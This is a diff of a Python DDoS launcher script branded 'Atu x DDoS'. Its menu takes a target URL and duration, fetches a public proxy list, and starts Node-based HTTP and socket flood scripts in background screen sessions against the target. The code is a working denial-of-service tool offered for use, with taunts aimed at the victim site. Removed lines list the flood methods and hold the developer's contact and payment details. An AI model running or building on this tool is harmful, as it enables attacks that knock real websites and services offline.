@@ -9,44 +9,46 @@ import time
 import json
 import time
 try: 
-	import speedtest
-	import colorama
-	import requests
-	import httpx
+    import speedtest
+    import colorama
+    import requests
+    import httpx
 except Exception as e:
-	sys.exit(e)
+    sys.exit(e)
 
 
 class Color:
-	colorama.init(autoreset=True)
-	LB = colorama.Fore.LIGHTBLUE_EX
-	LC = colorama.Fore.LIGHTCYAN_EX
-	LG = colorama.Fore.LIGHTGREEN_EX
-	LR = colorama.Fore.LIGHTRED_EX
-	LY = colorama.Fore.LIGHTYELLOW_EX
-	RESET = colorama.Fore.RESET
+    colorama.init(autoreset=True)
+    LB = colorama.Fore.LIGHTBLUE_EX
+    LC = colorama.Fore.LIGHTCYAN_EX
+    LG = colorama.Fore.LIGHTGREEN_EX
+    LR = colorama.Fore.LIGHTRED_EX
+    LY = colorama.Fore.LIGHTYELLOW_EX
+    RESET = colorama.Fore.RESET
 
 
 class Home:
-	def __init__(self,
-	help,
-	contact):
-		self.help = help
-		self.contact = contact
+    def __init__(self,
+    help,
+    contact):
+        self.help = help
+        self.contact = contact
 
-	def styleText(self, text):
-		for animation in text:
-			sys.stdout.write(animation)
-			sys.stdout.flush()
-			if animation != ".":
-				time.sleep(0.01)
-			else:
-				time.sleep(1)
+    def styleText(self, text):
+        for animation in text:
+            sys.stdout.write(animation)
+            sys.stdout.flush()
+            if animation != ".":
+                time.sleep(0.01)
+            else:
+                time.sleep(1)
 
-	def home(self): 
-		print(f"""{Color.LR}
-
- ▄▄▄     ▄▄▄█████▓ █    ██    ▓█████▄ ▓█████▄  ▒█████    ██████     ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
+    def home(self): 
+        print(f"""{Color.LR}
+┌╌ ╌ ╌ ╌ ╌ ╌ ╌ ╌ ╌  ┐ 󰟗󰦐 󰦊 󰥰 󰟡
+ 🚀 Atu x DDoS 🚀
+└╌╌╌ ╌╌ ╌╌ ╌ ╌ ╌ ╌ ╌┘
+▄▄▄     ▄▄▄█████▓ █    ██    ▓█████▄ ▓█████▄  ▒█████    ██████     ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
 ▒████▄   ▓  ██▒ ▓▒ ██  ▓██▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
 ▒██  ▀█▄ ▒ ▓██░ ▒░▓██  ▒██░   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
 ░██▄▄▄▄██░ ▓██▓ ░ ▓▓█  ░██░   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
@@ -54,84 +56,104 @@ class Home:
  ▒▒   ▓▒█░ ▒ ░░   ░▒▓▒ ▒ ▒     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░    ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
   ▒   ▒▒ ░   ░    ░░▒░ ░ ░     ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
   ░   ▒    ░       ░░░ ░ ░     ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░       ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░ 
-      ░  ░           ░           ░       ░        ░ ░        ░           ░  ░                       ░  ░░ ░      ░  ░                                 ░       ░                                                                ░               
-Dev nganhtu 🤍               
-██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗    ██████╗ ██████╗  ██████╗ ███████╗
-██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
-██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝    ██║  ██║██║  ██║██║   ██║███████╗
-██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝     ██║  ██║██║  ██║██║   ██║╚════██║
-███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║      ██████╔╝██████╔╝╚██████╔╝███████║
-╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
+      ░  ░           ░           ░       ░        ░ ░        ░           ░  ░                       ░  ░░ ░      ░  ░                   
+                         
+ © Developer Nguyễn Anh Tú 🥺
 """)
-        print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
-        print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
-        print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET flood (JS)")
-        print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
-        print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
+        print(Color.LY+"["+Color.LC+"01"+Color.LR+"]"+Color.LB+" Layer4")
+        print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LY+" Layer7")
+        print(Color.LG+"["+Color.LY+"03"+Color.LR+"]"+Color.LB+" DDoS Attack")
+        print(Color.LR+"["+Color.LR+"04"+Color.LR+"]"+Color.LG+" DDoS Plus")
+        print(Color.LY+"["+Color.LB+"00"+Color.LR+"]"+Color.LC+" OUT")
         print("\n")
+        http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
         while True:
-            sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Atucuti"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+            sys.stdout.write(Color.LB+"^^ "+Color.LR+"["+Color.LG+"Zzw x DDoS"+Color.LB+" ? "+Color.LG+"1710"+Color.LR+"]"+Color.LB+"\n➜ "+Color.RESET)
             option = input()
-            if option in ['01', '1']:
+            if option == '01' or option == '1':
                 try:
-                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
-                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-                    reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
-                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
+                    url = str(input(f"{Color.LG} cc URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} cc Time: "+Color.RESET))
+                    reqs = int(input(f"{Color.LG} cc Reqs: "+Color.RESET))
+                    ATU_TOOL.styleText(" Djt Mẹ Pay Web...\n")
+                    for i in range(150):
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        time.sleep(0.01)
+                    with open("nat/http.txt", 'w') as p:
+                        p.write(httpx.get(http_proxy).text)
+                    subprocess.run([f'screen -dm node nat/Method/socket {url} nat/http.txt {floodtime} {reqs}'], shell=True)
                 except:
                     print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-            elif option in ['02', '2']:
+            elif option == '02' or option == '2':
                 try:
-                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
-                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
-                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
+                    url = str(input(f"{Color.LG} :( URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} :( Time: "+Color.RESET))
+                    ATU_TOOL.styleText(" Djt Mẹ Pay Web...\n")
+                    for i in range(150):
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        time.sleep(0.01)
+                    with open("nat/http.txt", 'w') as p:
+                        p.write(httpx.get(http_proxy).text)
+                    subprocess.run([f'screen -dm node nat/Method/flood GET {url} nat/http.txt {floodtime} 64 1'], shell=True)
                 except:
                     print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-            elif option in ['02', '3']:
+            elif option == '03' or option == '3':
                 try:
-                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
-                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
-                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
+                    url = str(input(f"{Color.LG} :( URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} :( Time: "+Color.RESET))
+                    ATU_TOOL.styleText(" Djt Mẹ Pay Web...\n")
+                    for i in range(200):
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        time.sleep(0.01)
+                    with open("nat/http.txt", 'w') as p:
+                        p.write(httpx.get(http_proxy).text)
+                    subprocess.run([f'screen -dm node nat/Method/httpget {url} {floodtime} 1'], shell=True)
                 except:
                     print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-            elif option in ['04', '4']:
+            elif option == '04' or option == '4':
                 try:
-                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
-                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
-                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
+                    url = str(input(f"{Color.LG} :( URL: "+Color.RESET))
+                    floodtime = int(input(f"{Color.LG} :( Time: "+Color.RESET))
+                    ATU_TOOL.styleText(" Djt Mẹ Pay Web...\n")
+                    for i in range(150):
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        print (f"{Color.LR}Start Data Attack ☠️ {Color.LG}" + url)
+                        time.sleep(0.01)
+                    with open("nat/http.txt", 'w') as p:
+                        p.write(httpx.get(http_proxy).text)
+                    subprocess.run([f'screen -dm node nat/Method/bypass {url} {floodtime}'], shell=True)
                 except:
                     print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-            elif option in ['ref', 'REF']:
-                self.l7()
-            elif option in ['home', 'HOME']:
-                F_Tool.home()
-            elif option in ['clear', 'CLEAR']:
-                os.system('clear')
-                self.l7()
-            elif option in ['help', 'HELP', '?']:
+            elif option == 'refresh' or option == 'REFRESH':
+                self.Method()
+            elif option == 'home' or option == 'HOME':
+                NAT_Tool.home()
+            elif option == 'clean' or option == 'CLEAN':
+                os.system('CLEAN')
+                self.Method()
+            elif option == 'help' or option == 'HELP':
                 print(self.help)
-            elif option in ['dev', 'DEV']:
-                print(self.dev)
-            elif option in ['exit', 'EXIT']:
-                subprocess.run(['pkill -f NAT.py'], shell=True)
-            elif option in ['stop', 'STOP']:
+            elif option == 'contact' or option == 'CONTACT':
+                print(self.contact)
+            elif option == 'exit' or option == 'EXIT':
+                subprocess.run(['pkill -f abc.py'], shell=True)
+            elif option == 'stop' or option == 'STOP':
                 subprocess.run(['pkill screen'], shell=True)
-                print(f"{Color.LG} [!] Attack Stopped!")
-            elif option in ['00', '0']:
+                print(f"{Color.LG} STOP ATTACK DONE!")
+            elif option == '00' or option == '0':
                 os.system('clear');self.bbos()
-            elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
-                os.system('clear');Tool.bbos()
             elif option == "":
                 pass
             else:
                 print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
 
-def soon():
-    pass
 
 def spoof_useragents():
     spoof_ip = []
@@ -160,44 +182,11 @@ def spoof_useragents():
     }
 
 def main():
-    #  checking if you're gay 👍
-    F_Tool.styleText("[+] Checking Dependencies...\n\n")
-    pkgs = ['screen', 'node']
-    install = True
-    for pkg in pkgs:
-        ur_mom = which(pkg)
-        if ur_mom == None:
-            F_Tool.styleText(f"[!] {pkg} is not installed!\n")
-            install = False
-        else:
-            pass
-    if install == False:
-        sys.exit(f'\n[?] Error? try:{Color.LG} sh setup.sh')
-    else:pass
-    try:
-        script = True
-        with open('utils') as important:pass
-    except IsADirectoryError:pass
-    except FileNotFoundError:
-        print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
-        print("\n[+] Please download on GitHub, or git clone: https://github.com/ngdangtr/F-Tool\n")
-        os.remove(f'{__file__}')
-        script = False
-    if script == False:sys.exit()
-    else:NAT.home()
+    NAT_Tool.home()
 
 
 if __name__ == '__main__':
-    commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Back to home
-{Color.LC}REF{Color.LR} ~> {Color.LY}Refresh the menu
-{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Clear your face xd
-{Color.LC}EXIT{Color.LR} ~> {Color.LY}Exit the program
-{Color.LC}BBOS{Color.LR} ~> {Color.LY}L4/L7 DDOS Attack
-{Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
-{Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/dev Fb https://www.facebook.com/17th10xxx"""
-    dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/atucutis1
-{Color.LC}Momo{Color.LR}: {Color.LY}0564682944"""
-    NAT = Home(commands, dev)
-    Tool = Tool(commands, dev, spoof_useragents())
-    try:open(NAT.py');main()
-    except:quit()
+    commands = f"""HOME: Quay Lại Trang Đầu\nREFRESH: Làm Mới Menu\nCLEAN: Xoá Tất Cả\nEXIT: Thoát\nSTOP: Ngừng DDoS\nCONTACT: Contact/Hỗ Trợ"""
+    contact = f"""Facebook: https://www.facebook.com/17th10xxx\nProfile: """
+    NAT_Tool = Home(commands, contact)
+    main()
